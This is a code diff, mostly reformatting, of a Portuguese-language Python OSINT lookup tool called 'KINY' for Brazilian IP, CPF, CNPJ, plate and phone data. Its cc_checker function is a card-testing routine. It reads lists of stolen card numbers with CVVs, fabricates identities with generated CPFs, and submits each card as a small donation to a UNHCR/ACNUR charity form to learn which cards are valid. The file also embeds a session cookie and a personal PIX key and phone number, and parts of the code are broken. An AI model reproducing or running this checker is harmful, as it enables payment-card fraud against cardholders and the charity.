@@ -1,15 +1,15 @@
-global R,B,C,Y,G,RT,CY,CO
-CO='\033[m'
-R='\033[1;31m'
-B='\033[1;34m'
-C='\033[1;37m'
-CY='\033[1;36m'
-Y='\033[1;33m'
-G='\033[1;32m'
-RT='\033[;0m'
-import os,base64,requests,time,json,re,random,platform,sys,signal,atexit,argparse,hashlib,urllib3,html5lib
+global R, B, C, Y, G, RT, CY, CO
+CO = '\033[m'
+R = '\033[1;31m'
+B = '\033[1;34m'
+C = '\033[1;37m'
+CY = '\033[1;36m'
+Y = '\033[1;33m'
+G = '\033[1;32m'
+RT = '\033[;0m'
+import os, base64, requests, time, json, re, random, platform, sys, signal, atexit, argparse, hashlib, urllib3, html5lib
 from pytube import YouTube
-#from fordev.generator import people #presente pra quem estiver lendo
+# from fordev.generator import people #presente pra quem estiver lendo
 from time import sleep
 from random import randint
 from colorama import Fore, Style
@@ -21,30 +21,36 @@ from phonenumbers import geocoder
 from phonenumbers import timezone
 from urllib.parse import urlencode
 
-def clear():
-    os.system('cls' if os.name == 'nt' else 'clear')
 
 def clear():
     os.system('cls' if os.name == 'nt' else 'clear')
-    
+
+
+def clear():
+    os.system('cls' if os.name == 'nt' else 'clear')
+
+
 def aovivo():
-	print(f'{C}==={R}{C} Notas de ao vivo {C}==={R}{C}')
-	print()
-	print("Esta parte foi criada par esclarecer algumas coisas sobre o script")
-	print()
-	print("Q: Consulta Premium - Esta consulta parou pelo motivo do dono do painel fechar as API, estou tentando juntar dinheiro para comprar uma nova - Minha Chave PIX(Meta - R$100): 228463d7-0bec-44bd-bddd-a780d9530f27")
-	print()
-	print("Q: A Consulta de Nome de Mae parou pelo mesmo motivo da anterior.")
-	print()
-	print("Q: PhoneInfoga - A forma de consulta do PhoneInfoga é o DDI, DDD e o numero(ex: 5521979180533). quanto um numero tiver apenas 8 digitos, voce deve colocar um nove na frente(ex: 55 81 9××××-××××).")
-	print()
-	print("Q: Hoje, dia 17/03/2021, iremos comprar as novas API's ilimitadas")
-	print()
-	print("Q: Próxima Atualizacao sai em Abril.")
-	print()
-	print("Meu contato: 55 21 7918-0533")
-	print()
-	pause = input("Pressione Enter para retornar")
+    print(f'{C}==={R}{C} Notas de ao vivo {C}==={R}{C}')
+    print()
+    print("Esta parte foi criada par esclarecer algumas coisas sobre o script")
+    print()
+    print(
+        "Q: Consulta Premium - Esta consulta parou pelo motivo do dono do painel fechar as API, estou tentando juntar dinheiro para comprar uma nova - Minha Chave PIX(Meta - R$100): 228463d7-0bec-44bd-bddd-a780d9530f27")
+    print()
+    print("Q: A Consulta de Nome de Mae parou pelo mesmo motivo da anterior.")
+    print()
+    print(
+        "Q: PhoneInfoga - A forma de consulta do PhoneInfoga é o DDI, DDD e o numero(ex: 5521979180533). quanto um numero tiver apenas 8 digitos, voce deve colocar um nove na frente(ex: 55 81 9××××-××××).")
+    print()
+    print("Q: Hoje, dia 17/03/2021, iremos comprar as novas API's ilimitadas")
+    print()
+    print("Q: Próxima Atualizacao sai em Abril.")
+    print()
+    print("Meu contato: 55 21 7918-0533")
+    print()
+    pause = input("Pressione Enter para retornar")
+
 
 def notes():
     print(f'{C}==={R}{C} Notas de versão {C}==={R}{C}')
@@ -67,6 +73,7 @@ def notes():
     ''')
     pause = input('Pressione enter para retornar.')
 
+
 def covid19():
     os.system('figlet KINY')
     print(f'{C}[{Y}i{C}] Informe o UF. Exemplo: sp, pa, ba ')
@@ -84,7 +91,8 @@ def covid19():
     print("Recusados: {}".format(data['refuses']))
     pausa = input('Pressione enter para retornar ao menu.')
 
-def ip(ip_api,mode,token):
+
+def ip(ip_api, mode, token):
     os.system('figlet KINY')
     if ip_api == 0 or ip_api == 2:
         if mode == 0:
@@ -93,7 +101,8 @@ def ip(ip_api,mode,token):
             ip_input = input("===>")
             data = requests.get('http://ip-api.com/json/{}'.format(ip_input))
         adress_data = data.json()
-        weather_data = requests.get('http://api.openweathermap.org/data/2.5/weather?lat={lat}&lon={lon}&appid={token[2]}')
+        weather_data = requests.get(
+            'http://api.openweathermap.org/data/2.5/weather?lat={lat}&lon={lon}&appid={token[2]}')
         weather = json.loads(weather_data.text)
         if (adress_data['status']) == 'success':
             print('IP: {}'.format(adress_data['query']))
@@ -108,13 +117,13 @@ def ip(ip_api,mode,token):
             print('Internet-Info: {}'.format(adress_data['as']))
             print('ISP: {}'.format(adress_data['isp']))
             print('ORG: {}'.format(adress_data['org']))
-            #print('Temperatura: {}'.format(weather["weather"]["main"]))
+            # print('Temperatura: {}'.format(weather["weather"]["main"]))
     if ip_api == 1 or ip_api == 2:
         if mode == 1:
             ip_input = input("===>")
-            api=requests.get('http://ipwhois.app/json/'+ip_input).json()
+            api = requests.get('http://ipwhois.app/json/' + ip_input).json()
         if mode == 0:
-            api=requests.get('http://ipwhois.app/json/').json()
+            api = requests.get('http://ipwhois.app/json/').json()
         clear()
         os.system('figlet KINY')
         try:
@@ -146,7 +155,7 @@ def ip(ip_api,mode,token):
             print(f'{C}[{R}ERROR{C}] IP Inválido ')
             time.sleep(3)
             clear()
-            ip(ip_api,mode)
+            ip(ip_api, mode)
 
     print(f"{C}[{Y}i{C}]DESEJA LOCALIZAR UM NOVO IP?")
     print(f"{C}{G}[1]{C} Sim")
@@ -154,16 +163,18 @@ def ip(ip_api,mode,token):
     vi = input('===> ')
     if vi == '1' or vi == '01':
         clear()
-        ip(ip_api,mode)
+        ip(ip_api, mode)
+
 
 def bin():
     os.system('figlet KINY')
     print('Exemplo:45717360')
     print(f'{C}[{Y}i{C}] Digite a BIN.')
     bin_input = input("===>")
-    headers = {"Accept-Version":"3","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"}
+    headers = {"Accept-Version": "3",
+               "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"}
     try:
-        req = requests.get('https://lookup.binlist.net/'+bin_input,headers = headers)
+        req = requests.get('https://lookup.binlist.net/' + bin_input, headers=headers)
         req_data = req.json()
     except:
         print(f'{C}[{R}ERROR{C}] Ocorreu um erro,tente novamente.')
@@ -189,6 +200,7 @@ def bin():
         print(f'{C}[{R}ERROR{C}] Opção inválida')
         time.sleep(3)
 
+
 def crm(token):
     os.system("figlet KINY")
     print(f'{C}[{G}i{C}] Digite o numero do CRM.')
@@ -196,14 +208,14 @@ def crm(token):
     print(f'{C}[{G}i{C}] Digite o UF.')
     uf_input = input("===>")
     try:
-        url = 'https://www.consultacrm.com.br/api/index.php?tipo=crm&uf='+uf_input
-        data = requests.get(url+'&q={}&chave={}&destino=json'.format(crm_input,token[1]))
+        url = 'https://www.consultacrm.com.br/api/index.php?tipo=crm&uf=' + uf_input
+        data = requests.get(url + '&q={}&chave={}&destino=json'.format(crm_input, token[1]))
         crm_data = data.json()
     except:
         print(f'{C}[{R}ERROR{C}] CRM ou UF invalido')
-        #consultas = (crm_data['api_limite']) - (crm_data['api_consultas'])
+        # consultas = (crm_data['api_limite']) - (crm_data['api_consultas'])
     if (crm_data['status']) == "true":
-                #print('Consultas restantes ='+consultas)
+        # print('Consultas restantes ='+consultas)
         try:
             print('CRM: {}'.format(crm_data["item"][0]["numero"]))
             print('Nome: {}'.format(crm_data["item"][0]["nome"]))
@@ -227,35 +239,38 @@ def crm(token):
     else:
         print("Opcao invalida.")
 
-def gerar_pessoa(token): #####REWORK
+
+def gerar_pessoa(token):  #####REWORK
     os.system('figlet KINY')
     print(f'{C}[{G}i{C}] Gerando pessoa.')
-    national = ["BR","USA","PT","CA","JP"]
-    RN = randint(0,10)
-    cns=requests.get('http://geradorapp.com/api/v1/cns/generate?token={}'.format(token[0])).json()
-    cpf=requests.get('http://geradorapp.com/api/v1/cpf/generate?token={}'.format(token[0])).json()
-    pessoa= requests.get('https://randomuser.me/api/?nat={}'.format(random.choice('national'))).json()
+    national = ["BR", "USA", "PT", "CA", "JP"]
+    RN = randint(0, 10)
+    cns = requests.get('http://geradorapp.com/api/v1/cns/generate?token={}'.format(token[0])).json()
+    cpf = requests.get('http://geradorapp.com/api/v1/cpf/generate?token={}'.format(token[0])).json()
+    pessoa = requests.get('https://randomuser.me/api/?nat={}'.format(random.choice('national'))).json()
 
-    states = ["AC","AL","AP","AM","BA","SP","RJ","MT","CE","DF","ES","GO","MA","MS","MG","PA","PB","PR","PE","PI","RN","RS","RO","RR","SC","SE","TO"]
+    states = ["AC", "AL", "AP", "AM", "BA", "SP", "RJ", "MT", "CE", "DF", "ES", "GO", "MA", "MS", "MG", "PA", "PB",
+              "PR", "PE", "PI", "RN", "RS", "RO", "RR", "SC", "SE", "TO"]
     state = random.choice(states)
 
-    email_provider = ["@gmail.com","@outlook.com","@yahoo.com","@terra.com"]
+    email_provider = ["@gmail.com", "@outlook.com", "@yahoo.com", "@terra.com"]
 
-    email = (pessoa['results'][0]['name']['first']) + "." + (pessoa['results'][0]['name']['last']) + random.choice(email_provider)
+    email = (pessoa['results'][0]['name']['first']) + "." + (pessoa['results'][0]['name']['last']) + random.choice(
+        email_provider)
 
     if pessoa['results'][0]['gender'] == 'female':
         gender = 'F'
     if pessoa['results'][0]['gender'] == 'male':
         gender = 'M'
-    age = randint(18,80)
+    age = randint(18, 80)
 
-    print('Nome: {} {}'.format(pessoa['results'][0]['name']['first'],pessoa['results'][0]['name']['last']))
+    print('Nome: {} {}'.format(pessoa['results'][0]['name']['first'], pessoa['results'][0]['name']['last']))
     print('Genero: {}'.format(gender))
     print('Nascimento: {}'.format(pessoa['results'][0]['dob']['date'][0:10]))
     print('CPF: {}'.format(cpf['data']['number_formatted']))
     print('CPF sem formatação: {}'.format(cpf['data']['number']))
     print('E-mail: {}'.format(email))
-    print('CEP: {}{}'.format(pessoa['results'][0]['location']['postcode'],'-000'))
+    print('CEP: {}{}'.format(pessoa['results'][0]['location']['postcode'], '-000'))
     print('Endereço: {}'.format(pessoa['results'][0]['location']['street']['name']))
     print('Cidade: {}'.format(pessoa['results'][0]['location']['city']))
     print('Estado: {}'.format(pessoa['results'][0]['location']['state']))
@@ -267,53 +282,55 @@ def gerar_pessoa(token): #####REWORK
         clear()
         gerar_pessoa(token)
 
+
 def consultaplaca():
-    #http://api.masterplaca.devplank.com/v2/placa/{placa}/json
-            os.system("figlet KINY")
-            print(f'{C}[{G}i]{C}Digite o numero da placa.')
-            placa_input = input("===>")
-            req = requests.get('https://apicarros.com/v1/consulta/{}/json'.format(placa_input), verify = False) # JSQ7436
-            placa_data = req.json()
-            clear()
-            os.system('figlet KINY')
-            try:
-                if (placa_data['codigoRetorno']) == "0":
-                    print(f"{C}Ano: {B}{placa_data['ano']}{C}")
-                    print(f"Data: {B}{placa_data['data']}{C}")
-                    print(f"Modelo: {B}{placa_data['modelo']}{C}")
-                    print(f"Ano do modelo: {B}{placa_data['anoModelo']}{C}")
-                    print(f"Cor: {B}{placa_data['cor']}{C}")
-                    print(f"Marca: {B}{placa_data['marca']}{C}")
-                    print(f"Roubo/furto: {B}{placa_data['dataAtualizacaoRouboFurto']}{C}")
-                    print(f"Situação: {B}{placa_data['situacao']}{C}")
-                    print(f"Placa: {B}{placa_data['placa']}{C}")
-                    print(f"Chassi: {B}{placa_data['chassi']}{C}")
-                    print(f"UF: {B}{placa_data['uf']}{C}")
-                    print(f"Município: {B}{placa_data['municipio']}{C}")
-                    print(f"Modificada em: {B}{placa_data['dataAtualizacaoCaracteristicasVeiculo']}{C}")
-                    print(f"Alarme atualizado: {B}{placa_data['dataAtualizacaoAlarme']}{C}")
-                    print(f"Mensagem de retorno: {B}{placa_data['mensagemRetorno']}{C}")
-                    print(f"Código de retorno: {B}{placa_data['codigoRetorno']}{C}")
-                else:
-                    print(f'{C}[{R}i]{C} Sem dados sobre.')
-            except:
-                print(f'{C}[{R}ERROR{C}] Placa invalida')
-                time.sleep(3)
-            del placa_data
-            del req
-            del placa_input
-            print(f'{C}[{G}i{C}] Deseja realizar uma nova consulta?')
-            print('1.Sim')
-            print('2.Não')
-            choice = input("===>")
-            if choice == "1" or choice == "01":
-                tools.consultaplaca()
-            if choice == "2" or choice == "02":
-                pass
-            else:
-                print("Opcao invalida.")
-          	
-def cns(token,anim):
+    # http://api.masterplaca.devplank.com/v2/placa/{placa}/json
+    os.system("figlet KINY")
+    print(f'{C}[{G}i]{C}Digite o numero da placa.')
+    placa_input = input("===>")
+    req = requests.get('https://apicarros.com/v1/consulta/{}/json'.format(placa_input), verify=False)  # JSQ7436
+    placa_data = req.json()
+    clear()
+    os.system('figlet KINY')
+    try:
+        if (placa_data['codigoRetorno']) == "0":
+            print(f"{C}Ano: {B}{placa_data['ano']}{C}")
+            print(f"Data: {B}{placa_data['data']}{C}")
+            print(f"Modelo: {B}{placa_data['modelo']}{C}")
+            print(f"Ano do modelo: {B}{placa_data['anoModelo']}{C}")
+            print(f"Cor: {B}{placa_data['cor']}{C}")
+            print(f"Marca: {B}{placa_data['marca']}{C}")
+            print(f"Roubo/furto: {B}{placa_data['dataAtualizacaoRouboFurto']}{C}")
+            print(f"Situação: {B}{placa_data['situacao']}{C}")
+            print(f"Placa: {B}{placa_data['placa']}{C}")
+            print(f"Chassi: {B}{placa_data['chassi']}{C}")
+            print(f"UF: {B}{placa_data['uf']}{C}")
+            print(f"Município: {B}{placa_data['municipio']}{C}")
+            print(f"Modificada em: {B}{placa_data['dataAtualizacaoCaracteristicasVeiculo']}{C}")
+            print(f"Alarme atualizado: {B}{placa_data['dataAtualizacaoAlarme']}{C}")
+            print(f"Mensagem de retorno: {B}{placa_data['mensagemRetorno']}{C}")
+            print(f"Código de retorno: {B}{placa_data['codigoRetorno']}{C}")
+        else:
+            print(f'{C}[{R}i]{C} Sem dados sobre.')
+    except:
+        print(f'{C}[{R}ERROR{C}] Placa invalida')
+        time.sleep(3)
+    del placa_data
+    del req
+    del placa_input
+    print(f'{C}[{G}i{C}] Deseja realizar uma nova consulta?')
+    print('1.Sim')
+    print('2.Não')
+    choice = input("===>")
+    if choice == "1" or choice == "01":
+        tools.consultaplaca()
+    if choice == "2" or choice == "02":
+        pass
+    else:
+        print("Opcao invalida.")
+
+
+def cns(token, anim):
     os.system('figlet KINY')
     print(f'''
 {C}[{G}i{C}]Formas de operação
@@ -323,20 +340,20 @@ def cns(token,anim):
     choice = input('===>')
     clear()
     if choice == '1' or choice == '01':
-            print(f'{C}[{G}i{C}] Gerando CNS')
-            cns=requests.request('GET','http://geradorapp.com/api/v1/cns/generate?token={}'.format(token[0])).json()
-            cns2=cns['data']['number_formatted']
-            entrada=cns['data']['number']
-            print(f'{C}[{Y}i{C}] O CNS gerado foi: '+cns2)
-            if anim == 1:
-                time.sleep(1)
-            print(f'{C}[{G}i{C}] Consultando CNS...')
+        print(f'{C}[{G}i{C}] Gerando CNS')
+        cns = requests.request('GET', 'http://geradorapp.com/api/v1/cns/generate?token={}'.format(token[0])).json()
+        cns2 = cns['data']['number_formatted']
+        entrada = cns['data']['number']
+        print(f'{C}[{Y}i{C}] O CNS gerado foi: ' + cns2)
+        if anim == 1:
+            time.sleep(1)
+        print(f'{C}[{G}i{C}] Consultando CNS...')
     if choice == '2' or choice == '02':
         entrada = input('===>')
     if anim == 1:
         time.sleep(1)
     clear()
-    cns_data = requests.get('http://geradorapp.com/api/v1/cns/validate/{}?token={}'.format(entrada,token[0])).json()
+    cns_data = requests.get('http://geradorapp.com/api/v1/cns/validate/{}?token={}'.format(entrada, token[0])).json()
     try:
         print('Numero: {}'.format(cns_data["data"]["number"]))
         print('Mensagem: {}'.format(cns_data["data"]["message"]))
@@ -347,7 +364,9 @@ def cns(token,anim):
     print(f"{C}{G}[2]{C} Não")
     lo = input('===> ')
     if lo == '1' or lo == '01':
-        cns(token,anim)
+        cns(token, anim)
+
+
 def cep(anim):
     clear()
     os.system('figlet KINY')
@@ -386,6 +405,7 @@ def cep(anim):
         del adress_data
         del request
 
+
 def kiny_infoga():
     os.system("apt install nmap whois")
     clear()
@@ -402,10 +422,11 @@ def kiny_infoga():
         print("URL: ""http://www." + k)
         os.system("nmap " + k)
         os.system("whois " + k)
-    print ("Pressione enter para voltar.")
+    print("Pressione enter para voltar.")
     pause = input("====>")
 
-def cnpj(kct,token,anim):
+
+def cnpj(kct, token, anim):
     clear()
     if kct == '1' or kct == '01':
         gen = "1"
@@ -417,14 +438,14 @@ def cnpj(kct,token,anim):
     else:
         print('Opção inválida')
         time.sleep(3)
-        cnpj(token,anim)
+        cnpj(token, anim)
     if gen == "1":
         print(f'{C}[{G}*{C}] Gerando CNPJ...')
         if anim == '1':
             time.sleep(1)
-        cnpj_data=requests.get('http://geradorapp.com/api/v1/cnpj/generate?token={}'.format(token[0])).json()
+        cnpj_data = requests.get('http://geradorapp.com/api/v1/cnpj/generate?token={}'.format(token[0])).json()
         cnpj_input = (cnpj_data['data']['number'])
-        cnpj_formatted=(cnpj_data['data']['number_formatted'])
+        cnpj_formatted = (cnpj_data['data']['number_formatted'])
         print(f'{C}[{Y}i{C}] O CNPJ gerado foi: {cnpj_formatted}')
     print(f'{C}[{G}i{C}] Consultando CNPJ... ')
     try:
@@ -476,24 +497,25 @@ def cnpj(kct,token,anim):
             pass
     else:
         try:
-            print(f'{C}[{R}ERROR{C}]'+'{}: CNPJ INVALIDO.'.format(cnpj_formatted))
+            print(f'{C}[{R}ERROR{C}]' + '{}: CNPJ INVALIDO.'.format(cnpj_formatted))
         except:
             print(f'{C}[{R}ERROR{C}] Sem dados.')
         if gen == '1':
             del cnpj_data
             del cnpj_input
             del cnpj_formatted
-            tagain='1'
+            tagain = '1'
             print(f'{C}[{Y}i{C}]Tentando novamente...')
             time.sleep(3)
-            cnpj(kct,token,anim)
+            cnpj(kct, token, anim)
     if tagain == '0':
         print(f"{C}[{Y}i{C}] DESEJA REALIZAR UMA NOVA CONSULTA?")
         print(f"{C}[{G}1{C}] Sim")
         print(f"{C}[{G}2{C}] Não")
         lo = input('===> ')
         if lo == '1' or lo == '01':
-            cnpj(kct,token,anim)
+            cnpj(kct, token, anim)
+
 
 def bank(anim):
     clear()
@@ -519,7 +541,7 @@ def bank(anim):
         else:
             print('{}: Código bancário inválido.'.format(bank_input))
     except:
-         print(f'{C}[{R}ERROR{C}]Erro no servidor')
+        print(f'{C}[{R}ERROR{C}]Erro no servidor')
     print(f"{C}[{Y}i{C}] DESEJA CONSULTAR UM NOVO CODIGO BANCARIO? ")
     print(f"{C}[{G}1{C}] Sim")
     print(f"{C}[{G}2{C}] Não")
@@ -527,12 +549,14 @@ def bank(anim):
     if kc == '01' or kc == '1':
         bank(anim)
 
-def consultacpf(cpf_api,token):
+
+def consultacpf(cpf_api, token):
     clear()
     print(f'{C}[{Y}i{C}] Temporariamente Off')
     time.sleep(3)
     pass
-    
+
+
 def consultaoperadora():
     os.system("figlet KINY")
     print(f'{C}[{G}i{C}] Exemplo: 48952021826')
@@ -541,9 +565,11 @@ def consultaoperadora():
     op_input = input("===>")
     clear()
     os.system('figlet KINY')
-    headers = {"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"}
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"}
     try:
-        request = requests.get('http://free.telein.com.br/sistema/consulta_json.php?chave=senhasite&numero='+op_input, headers=headers)
+        request = requests.get('http://free.telein.com.br/sistema/consulta_json.php?chave=senhasite&numero=' + op_input,
+                               headers=headers)
         op_data = request.json()
     except:
         print(f'{C}[{R}i{C}] Limite de consultas atingido')
@@ -573,8 +599,8 @@ def consultaoperadora():
     if op_final == 'null':
         print(f'{C}[{R}*{C}] Operadora invalida.')
     else:
-        print(f'{C}[{G}*{C}] Operadora:'+op_final)
-    #print(op_data['operadora'])
+        print(f'{C}[{G}*{C}] Operadora:' + op_final)
+    # print(op_data['operadora'])
     print(f'{C}[{Y}i{C}] Deseja fazer uma nova consulta?')
     print('1.Sim')
     print('2.Não')
@@ -587,30 +613,32 @@ def consultaoperadora():
         print(f'{C}[{R}i{C}] Opção inválida')
         time.sleep(3)
 
+
 def cc_checker(token):
     try:
-        lista=open(input(f'{C}Caminho da lista: '), 'r').read().splitlines()
+        lista = open(input(f'{C}Caminho da lista: '), 'r').read().splitlines()
     except:
         lista = 0
         print(f'{C}[{R}i{C}] Erro,verifique se é um arquivo.')
         time.sleep(3)
-        
+
     if lista == 0:
         pass
     else:
         for gg in lista:
-            cc=gg.split('|')[0]
-            mes=gg.split('|')[1]
-            ano=gg.split('|')[2]
-            cvv=gg.split('|')[3]
+            cc = gg.split('|')[0]
+            mes = gg.split('|')[1]
+            ano = gg.split('|')[2]
+            cvv = gg.split('|')[3]
 
             data = requests.get('https://lookup.binlist.net/{}'.format(cc[0:6])).json()
             pessoa = requests.get('https://randomuser.me/api/?nat={}'.format(data['country']['alpha2'])).json()
             cpf = requests.get('http://geradorapp.com/api/v1/cpf/generate?token={}'.format(token[0])).json()
 
-            email_provider = ["@gmail.com","@outlook.com","@yahoo.com","@terra.com"]
+            email_provider = ["@gmail.com", "@outlook.com", "@yahoo.com", "@terra.com"]
 
-            email = (pessoa['results'][0]['first']) + "." + (pessoa['results'][0]['last']) + random.choice(email_provide)
+            email = (pessoa['results'][0]['first']) + "." + (pessoa['results'][0]['last']) + random.choice(
+                email_provide)
 
             print()
             print(f'{C}[{G}i{C}] Consultando cartão')
@@ -622,13 +650,13 @@ def cc_checker(token):
             print('Nivel: {}'.format(data['brand']))
             print()
             print(f'{C}[{G}i{C}] Gerando pessoa aleatoria')
-            print('Nome: {} {}'.format(pessoa['results'][0]['first'],pessoa['results'][0]['last']))
+            print('Nome: {} {}'.format(pessoa['results'][0]['first'], pessoa['results'][0]['last']))
             print('Genero: {}'.format(pessoa['results'][0]['gender']))
             print('Nascimento: {}'.format(pessoa['results'][0]['dob']['date'][0:10]))
             print('CPF: {}'.format(cpf['number_formatted']))
             print('CPF sem formatação: {}'.format(cpf['number']))
             print('E-mail: {}'.format(email))
-            print('CEP: {}{}'.format(pessoa['results'][0]['location']['postcode'],'-000'))
+            print('CEP: {}{}'.format(pessoa['results'][0]['location']['postcode'], '-000'))
             print('Endereço: {}'.format(pessoa['results'][0]['location']['street']['name']))
             print('Cidade: {}'.format(pessoa['results'][0]['location']['city']))
             print('Estado: {}'.format(pessoa['results'][0]['location']['state']))
@@ -651,7 +679,7 @@ def cc_checker(token):
                 'Accept-Encoding': 'gzip, deflate, br',
                 'Accept-Language': 'pt-BR,pt;q\u003d0.9,en-US;q\u003d0.8,en;q\u003d0.7',
                 'Cookie': 'ROUTEID\u003d.zolaBETA; _gcl_au\u003d1.1.751806228.1604113311; _ga\u003dGA1.3.972845617.1604113311; _gid\u003dGA1.3.1315302043.1604113311; _ga\u003dGA1.2.972845617.1604113311; _gid\u003dGA1.2.1315302043.1604113311; _uetsid\u003d6df17a801b2511eb91b7e9b62ecdda16; _uetvid\u003d6df60f501b2511ebb9704745327a0630; m_ses\u003d20201031000154; m_cnt\u003d0; _tq_id.TV-72092763-1.c79b\u003d24d79b933ff67001.1604113315.0.1604113315..; _fbp\u003dfb.1.1604113316536.1144821724; __qca\u003dP0-1736157422-1604113317181'
-                }
+            }
 
             if pessoa['results'][0]['gender'] == 'female':
                 gender = 'F'
@@ -663,31 +691,48 @@ def cc_checker(token):
                 tipo = 'D'
             nome = pessoa['results'][0]['first'] + pessoa['results'][0]['last']
 
-            donate='successUrl=https%3A%2F%2Fdoar.acnur.org%2Facnur%2Fagradecimento.html%3Fd%3DBRPT00GD00%2520General%26r%3Dtrue%26a%3D%24%7BconvertedAmount%7D%26t%3D%24%7Btransaction.referenceID%7D%26u%3D%24%7Btransaction.nativeResponse%7D%26m%3DcreditCard%26v%3Ddonate&errorUrl=https%3A%2F%2Fdoar.acnur.org%2Facnur%2Ferror.html&pfpsrc=&DESCRIPTION=Com+Os+Refugiados&ONLINE_FORM=BRPT00GD00+General&LANGUAGE=pt&CURRENCY='+pais.get('currency')+'&EXPDATE='+mes+ano[1:3]+'&TAXID='+cpf['number']+'&AMT=35&TYPE='+tipo2+'%2F'+band+'&PAYPERIOD=MONT&X=&FIRSTNAME='+pessoa['results'][0]['name']['first']+'&LASTNAME='+pessoa['results'][0]['name']['last']+'&EMAIL='+email.replace('@','%40')+'&GENDER='+gender+'&CUSTOM_KEY_1=birthdate&CUSTOM_KEY_2=device&CUSTOM_VALUE_1='+pessoa['results'][0]['dob']['date'][0:10].replace('/','%2F')+'&CUSTOM_VALUE_2=Mobile&GIFT_CUSTOM_KEY_1=birthdate&GIFT_CUSTOM_KEY_2=device&GIFT_CUSTOM_KEY_3=entrypoint&GIFT_CUSTOM_VALUE_1='+pessoa['results'][0]['dob']['date'][0:10].replace('/','%2F')+'&GIFT_CUSTOM_VALUE_2=Mobile&GIFT_CUSTOM_VALUE_3=%2Facnur%2Fdonate.html&STREET='+pessoa['results'][0]['location']['street']['name'].replace(' ','+')+'&STREET2='+Centro+'&CITY='+pessoa['results'][0]['location']['city'].replace(' ','+')+'&STATE='+pessoa(['results'][0]['location']['state'])+'&ZIP='+str(pessoa['results'][0]['location']['postcode'])+'-000'+'&COUNTRY='+data['country']+'&PHONENUM=%2811%29+98765-4321&CCTYPE='+tipo+'%2F'+data['scheme']+'&ACCT='+cc+'&NAME='+nome.replace(' ','+')+'&CVV2='+cvv
-            RS=requests.request('POST',donate,headers=h,data=data).url
-            if RS=='https://doar.acnur.org/acnur/agradecimento.html':
+            donate = 'successUrl=https%3A%2F%2Fdoar.acnur.org%2Facnur%2Fagradecimento.html%3Fd%3DBRPT00GD00%2520General%26r%3Dtrue%26a%3D%24%7BconvertedAmount%7D%26t%3D%24%7Btransaction.referenceID%7D%26u%3D%24%7Btransaction.nativeResponse%7D%26m%3DcreditCard%26v%3Ddonate&errorUrl=https%3A%2F%2Fdoar.acnur.org%2Facnur%2Ferror.html&pfpsrc=&DESCRIPTION=Com+Os+Refugiados&ONLINE_FORM=BRPT00GD00+General&LANGUAGE=pt&CURRENCY=' + pais.get(
+                'currency') + '&EXPDATE=' + mes + ano[1:3] + '&TAXID=' + cpf[
+                         'number'] + '&AMT=35&TYPE=' + tipo2 + '%2F' + band + '&PAYPERIOD=MONT&X=&FIRSTNAME=' + \
+                     pessoa['results'][0]['name']['first'] + '&LASTNAME=' + pessoa['results'][0]['name'][
+                         'last'] + '&EMAIL=' + email.replace('@',
+                                                             '%40') + '&GENDER=' + gender + '&CUSTOM_KEY_1=birthdate&CUSTOM_KEY_2=device&CUSTOM_VALUE_1=' + \
+                     pessoa['results'][0]['dob']['date'][0:10].replace('/',
+                                                                       '%2F') + '&CUSTOM_VALUE_2=Mobile&GIFT_CUSTOM_KEY_1=birthdate&GIFT_CUSTOM_KEY_2=device&GIFT_CUSTOM_KEY_3=entrypoint&GIFT_CUSTOM_VALUE_1=' + \
+                     pessoa['results'][0]['dob']['date'][0:10].replace('/',
+                                                                       '%2F') + '&GIFT_CUSTOM_VALUE_2=Mobile&GIFT_CUSTOM_VALUE_3=%2Facnur%2Fdonate.html&STREET=' + \
+                     pessoa['results'][0]['location']['street']['name'].replace(' ',
+                                                                                '+') + '&STREET2=' + Centro + '&CITY=' + \
+                     pessoa['results'][0]['location']['city'].replace(' ', '+') + '&STATE=' + pessoa(
+                ['results'][0]['location']['state']) + '&ZIP=' + str(
+                pessoa['results'][0]['location']['postcode']) + '-000' + '&COUNTRY=' + data[
+                         'country'] + '&PHONENUM=%2811%29+98765-4321&CCTYPE=' + tipo + '%2F' + data[
+                         'scheme'] + '&ACCT=' + cc + '&NAME=' + nome.replace(' ', '+') + '&CVV2=' + cvv
+            RS = requests.request('POST', donate, headers=h, data=data).url
+            if RS == 'https://doar.acnur.org/acnur/agradecimento.html':
                 print(f'{C}[{G}i{C}] Pagamento autorizado!')
             else:
-                RS=RS.split('=')[3]
-                if RS=='REFUSED_PAYMENT':
+                RS = RS.split('=')[3]
+                if RS == 'REFUSED_PAYMENT':
                     print(f'{C}[{R}ERROR{C}] Transação recusada.')
-                elif RS=='DATA_INVALID':
+                elif RS == 'DATA_INVALID':
                     print(f'{C}[{R}ERROR{C}] Cartão invalido.')
-                elif RS=='FAIL_UNKNOWN':
+                elif RS == 'FAIL_UNKNOWN':
                     print(f'{C}[{R}ERROR{C}] Erro Desconhecido ({R}possivel uso de cartao de Debito{C}).')
-                elif RS=='ERROR_NETWORK':
+                elif RS == 'ERROR_NETWORK':
                     print(f'{C}[{R}ERROR{C}] Erro de rede.')
-                elif RS=='DATA_CARD_NOT_ALLOWED':
+                elif RS == 'DATA_CARD_NOT_ALLOWED':
                     print(f'{C}[{R}ERROR{C}] Pagamento nao autorizado.')
-                elif RS=='REFUSED_PROVIDER':
+                elif RS == 'REFUSED_PROVIDER':
                     print(f'{C}[{R}ERROR{C}] Pagamento recusado pela {Y}{band}{C}.')
-                elif RS=='REFUSED_BANK':
-                    print('[{}ERROR{}] Recusado pelo {}{}{}.'.format(R,C,Y,banco.get('name'),C))
-                elif RS=='DATA_MISSING':
+                elif RS == 'REFUSED_BANK':
+                    print('[{}ERROR{}] Recusado pelo {}{}{}.'.format(R, C, Y, banco.get('name'), C))
+                elif RS == 'DATA_MISSING':
                     print(f'{C}[{R}ERROR{C}] Algum dado faltando.')
                 else:
                     print(f'{C}[{R}ERROR{C}] Erro não listado.')
                 pausa = ('Pressione enter para retornar.')
+
 
 def gerarlinkwhats():
     clear()
